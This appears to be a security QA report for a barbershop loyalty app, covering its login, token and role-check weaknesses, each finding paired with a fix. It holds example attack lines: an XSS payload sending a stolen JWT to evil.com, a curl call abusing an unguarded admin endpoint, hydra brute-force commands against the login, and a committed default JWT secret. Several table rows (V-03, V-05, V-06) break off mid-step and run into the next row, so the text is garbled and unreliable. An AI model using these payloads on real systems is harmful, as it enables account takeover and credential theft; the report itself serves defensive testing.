# Auth & Authorization — QA Test Matrix & Vulnerability Report

**Project:** Hyecuts Barbershop Loyalty  
**Scope:** Authentication (email/password + OAuth2/Google), Authorization (role guards), Session management, Token handling  
**Analysis Date:** 2026-06-24  
**Tester:** Senior QA Engineer / Red-team Security Engineer  
**Assumption:** Every user is malicious. Frontend validation is not trusted.

## Section 2: Vulnerability Report

| # | Vulnerability Title | Attack Scenario | Steps to Reproduce | Impact | Severity | Recommended Fix | Example Exploit Payload |
|---|---|---|---|---|---|---|---|
| V-01 | **No Endpoint-Level Authorization** | Any authenticated user (or unauthenticated) can call ANY API endpoint including admin-only endpoints like point manipulation, tier overrides, user list, and all bookings. | 1. Register a normal user account<br>2. Call `POST /api/admin/points/adjust/{userId}?points=99999` with the user's JWT<br>3. Points are adjusted without any role check | Full admin access for any user; complete data compromise | **Critical** | Replace `.anyRequest().permitAll()` with `.anyRequest().authenticated()` in SecurityConfig. Add `@PreAuthorize` annotations to all controllers. Use method-level security (`@EnableMethodSecurity`). | `curl -X POST "https://api.hyecuts.com/api/admin/points/adjust/$(victimId)?points=99999" -H "Authorization: Bearer $(anyUserToken)"` |
| V-02 | **JWT Stored in sessionStorage** | If an XSS vulnerability exists anywhere on the site, the attacker can read `sessionStorage.getItem('hc_token')` and exfiltrate the JWT. | 1. Find any XSS vector (stored/reflected/DOM)<br>2. Execute `fetch('https://evil.com/steal?t=' + sessionStorage.getItem('hc_token'))`<br>3. Use stolen JWT to impersonate user for 24h | Full account takeover; JWT is not httpOnly, not Secure by default | **Critical** | Move JWT to httpOnly, Secure, SameSite=Strict cookie. Remove all JS token storage. Or use a BFF (Backend for Frontend) pattern. | `// XSS payload: fetch('//evil.com/log?d='+sessionStorage.getItem('hc_token'))` |
| V-03 | **CSRF Globally Disabled** | Any cross-origin form POST or fetch (from whitelisted origins or via subdomain takeover on `*.vercel.app`/`*.railway.app`) can perform state-changing operations on behalf of a victim. | 1. Attacker controls `evil.vercel.app` (subdomain in allowed patterns)<br>2. Victim visits, JS makes `POST /api/bookings` or `POST /api/auth/register`<br>3. | V-04 | **No Rate Limiting on Login** | Attacker can brute force passwords, perform credential stuffing, or password spraying with no throttling. | 1. Run `hydra -l victim@email.com -P rockyou.txt https://api.hyecuts.com/api/auth/login -s 443`<br>2. Each attempt returns 401 instantly<br>3. Add CAPTCHA/reCAPTCHA to login. | `hydra -l admin@hyecuts.com -P /usr/share/wordlists/rockyou.txt hyecuts.com -s 443 https-post-form "/api/auth/login:{\"username\":\"admin@hyecuts.com\",\"password\":\"^PASS^\"}:Invalid credentials"` |
| V-05 | **Account Enumeration via Register Endpoint** | The register endpoint reveals whether a given email/username is already registered, allowing attackers to enumerate valid accounts. | 1. Send `POST /api/auth/register` with `{"username":"victim@email.com","password":"test123"}`<br>2. If response is 400 "Email or Username is already taken", the account exists<br>3. | V-06 | **Weak/Default JWT Secret** | In development mode, the JWT secret defaults to a base64-encoded string committed to the repo: `ZGV2LXNlY3JldC1rZXktdGhhdC1pcy1hdC1sZWFzdC0yNTYtYml0cy1sb25nLWZvci1oczI1Ng==` | 1. ## Summary of Findings

| Severity | Count | Key Issues |
|---|---|---|
| Critical | 6 | No endpoint auth, JWT in sessionStorage, CSRF disabled, no rate limiting, weak/default JWT secret, H2 console exposed |
| High | 8 | Account enumeration, OAuth2 token in URL, weak password policy, no MFA, no refresh token, horizontal privilege escalation, actuator exposure, no token revocation |
| Medium | 5 | No global JWT exception handler, clickjacking, missing CAPTCHA, RuntimeException in OAuth2 handler, no password reset |
| Low | 1 | CORS configuration is adequate |

**Recommended Immediate Actions:**
1. Add `@PreAuthorize` to ALL controller endpoints — replace `.anyRequest().permitAll()`
2. Move JWT from sessionStorage to httpOnly Secure SameSite cookie
3. Enable CSRF protection
4. Implement rate limiting on `/api/auth/login` and `/api/auth/register`
5. Harden JWT secret (remove default from config files)
6. Replace OAuth2 callback URL params with server-side session or POST-based token delivery
7. Add ownership checks on all `userId` path parameters
8. Add password strength validation server-side
